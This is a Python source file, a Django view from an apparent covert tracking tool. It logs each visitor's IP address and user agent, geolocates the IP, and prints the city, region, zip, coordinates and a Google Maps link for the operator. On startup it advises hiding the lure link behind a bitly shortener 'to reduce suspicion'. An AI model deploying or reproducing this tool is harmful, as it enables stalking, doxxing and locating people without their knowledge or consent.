from django.views.generic.base import TemplateView
from django.shortcuts import render
from lib.tracking import trytrack
from lib.host import http_tunnel
from json import loads

class index(TemplateView):
    template_name = "index.html"
    extra_context = None
    print ("\n\n[-] URL : {}\n    You can use a bitly.com url shortener to reduce suspicion\n\n".format(http_tunnel))


    def get_context_data(self,*args,**kwargs):
        self.kwargs.update(self.extra_context)
        return super().get_context_data(*args,**kwargs)

    def get(self,*args,**kwargs):
        clicker = {
                "IP":self.request.META.get("HTTP_X_FORWARDED_FOR"),
                "USERAGENT":self.request.headers["User-Agent"],
               }
        self.data = loads(trytrack(f'{clicker["IP"]}"').here())
        self.cord = "{},{}".format(
                self.data["latitude"],
                self.data["longitude"]
                )
        self.result = """\n\n\n\n
--------------------------------------------------
[*] Found
    - IP Address : {}
    - User Agent : {}
    - City : {}
    - Country name : {}
    - Region Code : {}
    - Region Name : {}
    - zip : {}
    - latitude : {}
    - longitude : {}

    [google maps] 

    - http://www.google.com/maps/place/{}

--------------------------------------------------
\n\n\n\n""".format(
        clicker["IP"],
        clicker["USERAGENT"],
        self.data["city"],
        self.data["country_name"],
        self.data["region_code"],
        self.data["region_name"],
        self.data["zip"],
        self.data["latitude"],
        self.data["longitude"],
        self.cord,
        )

        print (self.result)
        return render(self.request,"index.html")




